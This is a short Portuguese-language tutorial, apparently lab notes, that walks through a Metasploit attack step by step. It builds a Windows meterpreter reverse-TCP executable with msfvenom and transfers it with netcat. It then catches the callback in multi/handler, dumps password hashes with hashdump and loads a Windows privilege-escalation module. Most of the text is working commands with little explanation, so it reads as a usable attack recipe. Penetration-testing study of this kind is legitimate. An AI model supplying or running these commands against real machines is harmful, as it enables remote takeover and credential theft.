 # Multi-handler

Este módulo é um stub que fornece todos os recursos do sistema de carga útil Metasploit para exploits que foram lançados fora do framework. 

    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.110 lport=443 -f exe > file.exe

- lhost: IP do Host local que receberá a conexão reversa
- lport: Porta em qeue será realizada a conexão

- -f:  Tipo do arquivo

- file.exe: Arquivo que será criado

## Transferir o arquivo via Netcat

Windows:

    nc.exe -nvlp 1000 > file.exe

Kali Linux:

    netcat 192.168.10.125 1000 < file.exe

## Acessar msfconsole

No terminal como root, chame o msfconsole pelo comando abaixo:

    #msfconsole
<img src="msf1.png" width="70%">

Use o Multi Hanlder

    msf6 > use exploit/multi/handler 

<img src="msf2.png" width="70%">

    msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

    msf6 exploit(multi/handler) > set LHOST 192.168.10.110

    msf6 exploit(multi/handler) > show options

<img src="msf3.png">

    msf6 exploit(multi/handler) > run

<img src="msf4.png">

Clicando no arquivo que foi enviado para o WIndows

<img src="msf5.png">
Conexão bem sucedida

<img src="msf6.png">

meterpreter > pwd

C:\Windows\System32\netcat


    meterpreter > sysinfo 

    meterpreter > hashdump

     msf6 exploit(multi/handler) > background

    msf6 exploit(multi/handler) > sessions

    msf6 exploit(multi/handler) > use exploit/windows/local/ask 



 





